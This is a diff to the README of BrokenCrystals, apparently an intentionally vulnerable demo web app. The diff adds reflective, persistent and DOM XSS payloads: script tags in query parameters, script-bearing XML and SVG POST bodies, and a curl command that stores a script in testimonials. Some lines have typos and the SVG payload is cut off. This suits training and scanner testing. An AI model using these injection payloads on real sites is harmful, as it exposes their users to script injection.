@@ -80,14 +80,85 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
 - **Cross-Site Scripting (XSS)** -
 
-  - **Reflective XSS** can be demonstrated by using the mailing list subscription form on the landing page.
+  - **Reflective XSS** There are couple of endpoints that are vulnerable to reflective XSS:
+
+    - Landing page with the _dummy_ query param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
+    - Landing page maptitle param that contains DOM content (including script), add the provided DOM will be injected into the page and script executed.
+    - /api/testimonials/count page count param is vulnerable to reflective XSS.
+    - POST to https://brokencrystals.com/api/metadata with body XML body vulnarable for reflective XSS.
+    - POST to https://brokencrystals.com/api/metadata with body SVG body vulnarable for reflective XSS.
+
+    <details>
+      <summary>Reflective XSS Example Exploitation</summary>
+
+    To demonstrate reflective XSS, you can use the following payloads:
+
+    1. **Landing Page Dummy Query Parameter**:
+
+       - URL: `https://brokencrystals.com/?__dummy=__<script>alert('XSS')</script>`
+       - The `dummy` query parameter is directly injected into the DOM without sanitization, causing the script to execute.
+
+    2. **Landing Page Map Title Parameter**:
+
+       - URL: `https://brokencrystals.com/?maptitle=<script>alert('XSS')</script>`
+       - The `maptitle` parameter is used in the DOM and allows script execution.
+
+    3. **Testimonials Page Count Parameter**:
+       - URL: `https://brokencrystals.com/api/testimonials/count?query=<script>alert('XSS')</script>`
+       - The `query` parameter is reflected in the response without sanitization, allowing script execution.
+    4. **POST to /api/metadata with XML Body**:
+       - URL: `https://brokencrystals.com/api/metadata`
+       - Body: `<?xml version="1.0" encoding="UTF-8"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright986352")</x:script><child></child>`
+       - The XML body is processed and the script is executed in the response.
+    5. **POST to /api/metadata with SVG Body**:
+       - URL: `https://brokencrystals.com/api/metadata`
+       - Body: `<svg xmlns="http://www.w3.org2000/svg" xmlns:xlink="http://www.w3.org1999/xlink" viewBox="0 0 915 585"><g<x:script xmlns:x="http://www.w3.org/1999/xhtml">prompt("bright443188")</`
+
+    </details>
+
   - **Persistent XSS** can be demonstrated using add testimonial form on the landing page (for authenticated users only).
+
+    <details>
+      <summary>Persistent XSS Example Exploitation</summary>
+
+    To demonstrate persistent XSS, you can use the following steps:
+
+    1. Submit the following `curl` request to store the XSS payload:
+
+       ```bash
+       curl 'https://brokencrystals.com/api/testimonials' -X POST \
+       -H 'authorization: AUTH_TOKEN' \
+       -H 'Content-Type: application/json' \
+       --data-raw '{"name":"Test User","title":"Test Title","message":"<script>alert(12345)</script>"}'
+       ```
+
+    2. Visit the testimonials page at `https://brokencrystals.com/marketplace` to observe the execution of the XSS payload.
+
+    </details>
+
+  - **DOM Cross-Site Scripting** - can be demonstrated by using the mailing list subscription form on the landing page. The form sends a POST request to `/api/subscriptions?email=VALUE`, and the server's response is embedded into the page without any validation on either the server or client side. This allows an attacker to inject malicious scripts into the page.
+    <details>
+      <summary>Example Exploitation</summary>
+
+    To demonstrate this vulnerability, you can submit the following payload in the email field of the subscription form:
+
+    ```html
+    <script>
+      alert('XSS');
+    </script>
+    ```
+
+    Brobser perform a POST request to `/api/subscriptions?email=<script>alert("XSS")</script>'` with the payload in the email field.
+    The server's response will include the injected script, which will be embedded into the page and executed by the browser. This can be used to execute arbitrary JavaScript code in the context of the user's session.
+
+    Example:
+    ![Example of DOM XSS Exploitation](docs/bc_dom_xss.gif)
+
+    </details>
 
 - **Default Login Location** - The login endpoint is available under /api/auth/login.
 
 - **Directory Listing** - The Nginx config file under the nginx-conf directory is configured to allow directory listing.
-
-- **DOM Cross-Site Scripting** - Open the landing page with the _dummy_ query param that contains DOM content (including script), add the provided DOM into the page, and execute it.
 
 - **File Upload** - The application allows uploading an avatar photo of the authenticated user. The server doesn't perform any sort of validation on the uploaded file.
   <details>
@@ -112,7 +183,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   Successfully fetching the file shows that the server stored the file:
 
   ```bash
-  $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJleHAiOjE3NDI5NzkyOTJ9.NBfrHS7ydCltPBKDWuKbXvKJq901Q1cJHjyf3jhElJVAijuxNxOMCib-luiijXHHidIcgaHQrHF0ofcwBdaoZNfR244YEI0DalmruMd2xjumUJNy8jiofGgF0n-nwxp-CDdjN-xxV81oy7pscmHfYO07OyUWr1rqvPZYDejC1TGP8j1vlDeWkEB0gsE9NRb38DDwdkcjsy1UpLcidppVexUgCP60blghDTKYBEUFmfbFWNScN1BNSDvIhTIgXPX_GKuRueLayY15YtjCKRjqzjpTrTi80d5mf9nzoVIbo2RyjGRCg8LX7M1Zi7XRAhuZHV2JIMGqhXvWeFyN_BfQbxniZEcbP2SRUFhJChuZrf4JQeyhOQo_iPZb6xwJzHTY_Gd96jgGaMXgQLY933vI9s5Rc9TlpsVzPatESVK6ve1comR1k9xCeozEwpNY79kYjDIdFiUp8An0MSBYUbC-SvQWijB8wStogMyovWzJP83Lrpd77Oi5ZxK8onKBHMt8tKUkCZmFs8kAQLhkqq9QNiQVAhvnTJaIppy0kq0R-fBDeGWeMv3JLZbJUYea_mVmj3VhhlQ4PIJAhTTTTKTroKakfiCuDnzjIh3_voT2nrudCAP3tWsDgJRL6ViJNue4Xld2y2ASoMfgO52IAlr39Paxekq5nW-LHuZhsMxAMjY'
+  $ curl -i 'https://qa.brokencrystals.com/api/users/one/admin/photo' -H 'authorization: AITH_TOKEN'
   HTTP/2 200
   date: Wed, 26 Mar 2025 08:18:40 GMT
   content-type: application/octet-stream
